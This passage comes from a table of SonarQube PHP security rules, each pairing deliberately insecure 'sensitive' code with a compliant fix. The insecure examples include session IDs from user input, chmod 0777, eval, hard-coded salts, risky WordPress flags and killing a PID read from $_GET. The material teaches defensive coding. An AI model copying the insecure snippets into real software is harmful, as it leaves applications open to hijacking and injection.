  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/328" rel="nofollow">MITRE, CWE-328</a> - Reversible One-Way Hash </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> <a href="https://shattered.io/" rel="nofollow">SHAttered</a> - The first concrete collision attack against SHA-1. </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2964">
              php:S2964
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<h2>Why is this an issue?</h2>
<p><code>sleep</code> is sometimes used in a mistaken attempt to prevent Denial of Service (DoS) attacks by throttling response rate. But because it
ties up a thread, each request takes longer to serve that it otherwise would, making the application <em>more</em> vulnerable to DoS attacks, rather
than less.</p>
<h3>Noncompliant code example</h3>
<pre>
if (is_bad_ip($requester)) {
  sleep(5);  // Noncompliant
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S5328">
              php:S5328
            </a>
          </td>
          <td>
            <details>
              <p>If a session ID can be guessed (not generated with a secure pseudo random generator, or with insufficient length …​) an attacker may be able to
hijack another user’s session.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the session ID is not unique. </li><li> the session ID is set from a user-controlled input. </li><li> the session ID is generated with not secure pseudo random generator. </li><li> the session ID length is too short. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t manually generate session IDs, use instead language based native functionality.</p>
<h2>Sensitive Code Example</h2>
<pre>
session_id(bin2hex(random_bytes(4))); // Sensitive: 4 bytes is too short
session_id($_POST[&#34;session_id&#34;]); // Sensitive: session ID can be specified by the user
</pre>
<h2>Compliant Solution</h2>
<pre>
session_regenerate_id(); ; // Compliant
session_id(bin2hex(random_bytes(16))); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-community/attacks/Session_fixation" rel="nofollow">OWASP Sesssion Fixation</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/330" rel="nofollow">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li><li> <a href="https://cwe.mitre.org/data/definitions/340" rel="nofollow">MITRE, CWE-340</a> - Generation of Predictable Numbers or Identifiers </li><li> <a href="https://www.php.net/random-bytes" rel="nofollow">PHP: random_bytes()</a> </li><li> <a href="https://www.php.net/session-regenerate-id" rel="nofollow">PHP: session_regenerate_id()</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2612">
              php:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix file system permissions, the &#34;<code>others</code>&#34; category refers to all users except the owner of the file system resource and the
members of the group assigned to this resource.</p>
<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive
information, disrupt services or elevate privileges.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The application is designed to be run on a multi-user environment. </li><li> Corresponding files and directories may contain confidential information. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<pre>
chmod(&#34;foo&#34;, 0777); // Sensitive
</pre>
<pre>
umask(0); // Sensitive
umask(0750); // Sensitive
</pre>
<p>For <a href="https://symfony.com/doc/current/components/filesystem.html" rel="nofollow">Symfony Filesystem</a>:</p>
<pre>
use Symfony\Component\Filesystem\Filesystem;

$fs &#61; new Filesystem();
$fs-&gt;chmod(&#34;foo&#34;, 0777); // Sensitive
</pre>
<p>For <a href="https://laravel.com/api/8.x/Illuminate/Filesystem/Filesystem.html" rel="nofollow">Laravel Filesystem</a>:</p>
<pre>
use Illuminate\Filesystem\Filesystem;

$fs &#61; new Filesystem();
$fs-&gt;chmod(&#34;foo&#34;, 0777); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
chmod(&#34;foo&#34;, 0750); // Compliant
</pre>
<pre>
umask(0027); // Compliant
</pre>
<p>For <a href="https://symfony.com/doc/current/components/filesystem.html" rel="nofollow">Symfony Filesystem</a>:</p>
<pre>
use Symfony\Component\Filesystem\Filesystem;

$fs &#61; new Filesystem();
$fs-&gt;chmod(&#34;foo&#34;, 0750); // Compliant
</pre>
<p>For <a href="https://laravel.com/api/8.x/Illuminate/Filesystem/Filesystem.html" rel="nofollow">Laravel Filesystem</a>:</p>
<pre>
use Illuminate\Filesystem\Filesystem;

$fs &#61; new Filesystem();
$fs-&gt;chmod(&#34;foo&#34;, 0750); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission" rel="nofollow">OWASP File Permission</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/266" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S1523">
              php:S1523
            </a>
          </td>
          <td>
            <details>
              <p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-9807" rel="nofollow">CVE-2017-9807</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-9802" rel="nofollow">CVE-2017-9802</a> </li></ul>
<p>Some APIs enable the execution of dynamic code by providing it as strings at runtime. These APIs might be useful in some very specific
meta-programming use-cases. However most of the time their use is frowned upon as they also increase the risk of <a href="https://owasp.org/www-community/attacks/Code_Injection" rel="nofollow">Injected Code</a>. Such attacks can either run on the server or in the client (exemple:
XSS attack) and have a huge impact on an application’s security.</p>
<p>This rule marks for review each occurrence of the <a href="https://www.php.net/manual/en/function.eval.php" rel="nofollow"><code>eval</code> function</a>. This
rule does not detect code injections. It only highlights the use of APIs which should be used sparingly and very carefully. The goal is to guide
security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the executed code may come from an untrusted source and hasn’t been sanitized. </li><li> you really need to run code dynamically. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the
code in a <a href="https://en.wikipedia.org/wiki/Sandbox_%28computer_security%29" rel="nofollow">sandboxed</a> environment. Use jails, firewalls and whatever means your
operating system and programming language provide (example: <a href="https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.&#43;Create&#43;a&#43;secure&#43;sandbox&#43;using&#43;a&#43;security&#43;manager" rel="nofollow">Security Managers</a> in java, <a href="https://www.w3schools.com/tags/att_iframe_sandbox.asp" rel="nofollow">iframes</a> and <a href="https://en.wikipedia.org/wiki/Same-origin_policy" rel="nofollow">same-origin
policy</a> for javascript in a web browser).</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<p>Avoid using dynamic code APIs whenever possible. Hard-coded code is always safer.</p>
<h2>Sensitive Code Example</h2>
<pre>
eval($code_to_be_dynamically_executed)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/95" rel="nofollow">MITRE, CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  (&#39;Eval Injection&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2053">
              php:S2053
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability increases the likelihood that attackers are able to compute the cleartext of password hashes.</p>
<h2>Why is this an issue?</h2>
<p>During the process of password hashing, an additional component, known as a &#34;salt,&#34; is often integrated to bolster the overall security. This salt,
acting as a defensive measure, primarily wards off certain types of attacks that leverage pre-computed tables to crack passwords.</p>
<p>However, potential risks emerge when the salt is deemed insecure. This can occur when the salt is consistently the same across all users or when it
is too short or predictable. In scenarios where users share the same password and salt, their password hashes will inevitably mirror each other.
Similarly, a short salt heightens the probability of multiple users unintentionally having identical salts, which can potentially lead to identical
password hashes. These identical hashes streamline the process for potential attackers to recover clear-text passwords. Thus, the emphasis on
implementing secure, unique, and sufficiently lengthy salts in password-hashing functions is vital.</p>
<h3>What is the potential impact?</h3>
<p>Despite best efforts, even well-guarded systems might have vulnerabilities that could allow an attacker to gain access to the hashed passwords.
This could be due to software vulnerabilities, insider threats, or even successful phishing attempts that give attackers the access they need.</p>
<p>Once the attacker has these hashes, they will likely attempt to crack them using a couple of methods. One is brute force, which entails trying
every possible combination until the correct password is found. While this can be time-consuming, having the same salt for all users or a short salt
can make the task significantly easier and faster.</p>
<p>If multiple users have the same password and the same salt, their password hashes would be identical. This means that if an attacker successfully
cracks one hash, they have effectively cracked all identical ones, granting them access to multiple accounts at once.</p>
<p>A short salt, while less critical than a shared one, still increases the odds of different users having the same salt. This might create clusters
of password hashes with identical salt that can then be attacked as explained before.</p>
<p>With short salts, the probability of a collision between two users&#39; passwords and salts couple might be low depending on the salt size. The shorter
the salt, the higher the collision probability. In any case, using longer, cryptographically secure salt should be preferred.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code contains examples of hard-coded salts.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$salt &#61; &#39;salty&#39;;
$hash &#61; hash_pbkdf2(&#39;sha256&#39;, $password, $salt, 100000); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$salt &#61; random_bytes(16);
$hash &#61; hash_pbkdf2(&#39;sha256&#39;, $password, $salt, 100000);
</pre>
<h3>How does this work?</h3>
<p>This code ensures that each user’s password has a unique salt value associated with it. It generates a salt randomly and with a length that
provides the required security level. It uses a salt length of at least 16 bytes (128 bits), as recommended by industry standards.</p>
<p>Here, the compliant code example ensures the salt is random and has a sufficient length by calling the <code>random_bytes</code> function with a
length parameter set to 16. This one internally uses a cryptographically secure pseudo random number generator.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP</a> Top 10:2021 A02:2021 - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP</a> - Top 10 2017 - A03:2017 - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/759" rel="nofollow">CWE</a> - CWE-759: Use of a One-Way Hash without a Salt </li><li> <a href="https://cwe.mitre.org/data/definitions/760" rel="nofollow">CWE</a> - CWE-760: Use of a One-Way Hash with a Predictable Salt </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S6348">
              php:S6348
            </a>
          </td>
          <td>
            <details>
              <p>By default, the WordPress administrator and editor roles can add unfiltered HTML content in various places, such as post content. This includes the
capability to add JavaScript code.</p>
<p>If an account with such a role gets hijacked, this capability can be used to plant malicious JavaScript code that gets executed whenever somebody
visits the website.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> You really need the possibility to add unfiltered HTML with editor or administrator roles. </li><li> There’s a chance that the accounts of authorized users get compromised. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The <code>unfiltered_html</code> capability should be granted to trusted roles that need to use markup when publishing dynamic content to the
WordPress website. If this capability is not required for all users, including administrators and editors roles, then it’s recommended to set
<code>DISALLOW_UNFILTERED_HTML</code> to <code>true</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
define( &#39;DISALLOW_UNFILTERED_HTML&#39;, false ); // sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
define( &#39;DISALLOW_UNFILTERED_HTML&#39;, true );
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S6345">
              php:S6345
            </a>
          </td>
          <td>
            <details>
              <p>External requests initiated by a WordPress server should be considered as security-sensitive. They may contain sensitive data which is stored in
the files or in the database of the server. It’s important for the administrator of a WordPress server to understand what they contain and to which
server they are sent.</p>
<p>WordPress makes it possible to block external requests by setting the <code>WP_HTTP_BLOCK_EXTERNAL</code> option to <code>true</code>. It’s then
possible to authorize requests to only a few servers using another option named <code>WP_ACCESSIBLE_HOSTS</code>.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Your WordPress website contains code which may call external requests to servers you don’t know. </li><li> Your WordPress website may send sensitive data to other servers. </li><li> Your WordPress website uses a lot of plugins or themes. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Uninstall WordPress plugins which send requests to servers you don’t know. </li><li> Make sure that <code>WP_HTTP_BLOCK_EXTERNAL</code> is defined in <code>wp-config.php</code>. </li><li> Make sure that <code>WP_HTTP_BLOCK_EXTERNAL</code> is set to <code>true</code>. </li><li> Make sure that <code>WP_ACCESSIBLE_HOSTS</code> is configured to authorize requests to the servers you trust. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
define( &#39;WP_HTTP_BLOCK_EXTERNAL&#39;, false ); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
define( &#39;WP_HTTP_BLOCK_EXTERNAL&#39;, true );
define( &#39;WP_ACCESSIBLE_HOSTS&#39;, &#39;api.wordpress.org&#39; );
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/" rel="nofollow">OWASP Top 10 2021 Category A10</a> - Server-Side Request
  Forgery (SSRF) </li><li> <a href="https://wordpress.org/support/article/editing-wp-config-php/#block-external-url-requestsl" rel="nofollow">wordpress.org</a> - Block External URL
  Requests </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery" rel="nofollow">OWASP Attack Category</a> - Server Side Request Forgery </li><li> <a href="https://cwe.mitre.org/data/definitions/918" rel="nofollow">MITRE, CWE-918</a> - Server-Side Request Forgery (SSRF) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S6346">
              php:S6346
            </a>
          </td>
          <td>
            <details>
              <p>WordPress has a database repair and optimization mode that can be activated by setting <code>WP_ALLOW_REPAIR</code> to <code>true</code> in the
configuration.</p>
<p>If activated, the repair page can be accessed by any user, authenticated or not. This makes sense because if the database is corrupted, the
authentication mechanism might not work.</p>
<p>Malicious users could trigger this potentially costly operation repeatadly slowing down the website, and making it unavailable.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The database is not currently corrupted. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enable automatic database repair mode only in case of database corruption. This feature should be deactivated again when the
database issue is resolved.</p>
<h2>Sensitive Code Example</h2>
<pre>
define( &#39;WP_ALLOW_REPAIR&#39;, true ); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
// The default value is false, so the value does not have to be expilicitly set.
define( &#39;WP_ALLOW_REPAIR&#39;, false );
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://wordpress.org/support/article/editing-wp-config-php/#automatic-database-optimizing" rel="nofollow">wordpress.org</a> - Automatic Database
  Optimizing </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S6341">
              php:S6341
            </a>
          </td>
          <td>
            <details>
              <p>WordPress makes it possible to edit theme and plugin files directly in the Administration Screens. While it may look like an easy way to customize
a theme or do a quick change, it’s a dangerous feature. When visiting the theme or plugin editor for the first time, WordPress displays a warning to
make it clear that using such a feature may break the web site by mistake. More importantly, users who have access to this feature can trigger the
execution of any PHP code and may therefore take full control of the WordPress instance. This security risk could be exploited by an attacker who
manages to get access to one of the authorized users. Setting the <code>DISALLOW_FILE_EDIT</code> option to <code>true</code> in
<code>wp-config.php</code> disables this risky feature. The default value is <code>false</code>.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> You really need to use the theme and plugin editors. </li><li> The theme and plugin editors are available to users who cannot be fully trusted. </li><li> There’s a chance that the accounts of authorized users get compromised. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Modify the theme and plugin files using a local editor and deploy them to the server in a secure way. </li><li> Make sure that <code>DISALLOW_FILE_EDIT</code> is defined in <code>wp-config.php</code>. </li><li> Make sure that <code>DISALLOW_FILE_EDIT</code> is set to <code>true</code>. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
define( &#39;DISALLOW_FILE_EDIT&#39;, false ); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
define( &#39;DISALLOW_FILE_EDIT&#39;, true );
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://wordpress.org/support/article/editing-wp-config-php/#disable-the-plugin-and-theme-editor" rel="nofollow">wordpress.org</a> - Disable the
  Plugin and Theme Editor </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li><li> <a href="https://cwe.mitre.org/data/definitions/94" rel="nofollow">MITRE, CWE-94</a> - Improper Control of Generation of Code (&#39;Code Injection&#39;) </li><li> <a href="https://cwe.mitre.org/data/definitions/95" rel="nofollow">MITRE, CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  (&#39;Eval Injection&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S6343">
              php:S6343
            </a>
          </td>
          <td>
            <details>
              <p>Automatic updates are a great way of making sure your application gets security updates as soon as they are available. Once a vendor releases a
security update, it is crucial to apply it in a timely manner before malicious actors exploit the vulnerability. Relying on manual updates is usually
too late, especially if the application is publicly accessible on the internet.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> there is no specific reason for deactivating all automatic updates. </li><li> you meant to deactivate only automatic major updates. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t deactivate automatic updates unless you have a good reason to do so. This way, you’ll be sure to receive security updates as soon as they are
available. If you are worried about an automatic update breaking something, check if it is possible to only activate automatic updates for minor or
security updates.</p>
<h2>Sensitive Code Example</h2>
<pre>
define( &#39;WP_AUTO_UPDATE_CORE&#39;, false ); // Sensitive
define( &#39;AUTOMATIC_UPDATER_DISABLED&#39;, true ); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
define( &#39;WP_AUTO_UPDATE_CORE&#39;, true ); // Minor and major automatic updates enabled
define( &#39;WP_AUTO_UPDATE_CORE&#39;, &#39;minor&#39; ); // Only minor updates are enabled
define( &#39;AUTOMATIC_UPDATER_DISABLED&#39;, false );
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://wordpress.org/support/article/editing-wp-config-php/#disable-wordpress-auto-updates" rel="nofollow">Wordpress.org</a> - Disable WordPress
  Auto Updates </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S1313">
              php:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-5901" rel="nofollow">CVE-2006-5901</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-3725" rel="nofollow">CVE-2005-3725</a> </li></ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul><li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li><li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li></ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul><li> Can give information to an attacker about the network topology. </li><li> It’s a personal (assigned to an identifiable person) IP address. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
$socket &#61; socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_connect($socket, &#39;8.8.8.8&#39;, 23);  // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
$socket &#61; socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_connect($socket, IP_ADDRESS, 23);  // Compliant
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li><li> Broadcast address 255.255.255.255 </li><li> Non-routable address 0.0.0.0 </li><li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm" rel="nofollow">often match
  Object Identifiers</a> (OID) </li><li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc5737" rel="nofollow">RFC 5737</a> </li><li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849" rel="nofollow">RFC
  3849</a> </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4828">
              php:S4828
            </a>
          </td>
          <td>
            <details>
              <p>Signaling processes or process groups can seriously affect the stability of this application or other applications on the same system.</p>
<p>Accidentally setting an incorrect <code>PID</code> or <code>signal</code> or allowing untrusted sources to assign arbitrary values to these
parameters may result in a denial of service.</p>
<p>Also, the system treats the signal differently if the destination <code>PID</code> is less than or equal to 0. This different behavior may affect
multiple processes with the same (E)UID simultaneously if the call is left uncontrolled.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The parameters <code>pid</code> and <code>sig</code> are untrusted (they come from an external source). </li><li> This function is triggered by non-administrators. </li><li> Signal handlers on the target processes stop important functions. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> For stateful applications with user management, ensure that only administrators trigger this code. </li><li> Verify that the <code>pid</code> and <code>sig</code> parameters are correct before using them. </li><li> Ensure that the process sending the signals runs with as few OS privileges as possible. </li><li> Isolate the process on the system based on its (E)UID. </li><li> Ensure that the signal does not interrupt any essential functions when intercepted by a target’s signal handlers. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
$targetPid &#61; (int)$_GET[&#34;pid&#34;];
posix_kill($targetPid, 9); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
$targetPid &#61; (int)$_GET[&#34;pid&#34;];

// Validate the untrusted PID,
// With a pre-approved list or authorization checks
if (isValidPid($targetPid)) {
    posix_kill($targetPid, 9);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/283" rel="nofollow">MITRE, CWE-283</a> - Unverified Ownership </li><li> <a href="https://man7.org/linux/man-pages/man1/kill.1.html" rel="nofollow">kill(1) — Linux manual page</a> </li><li> <a href="https://man7.org/linux/man-pages/man2/kill.2.html" rel="nofollow">kill(2) — Linux manual page</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4829">
              php:S4829
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
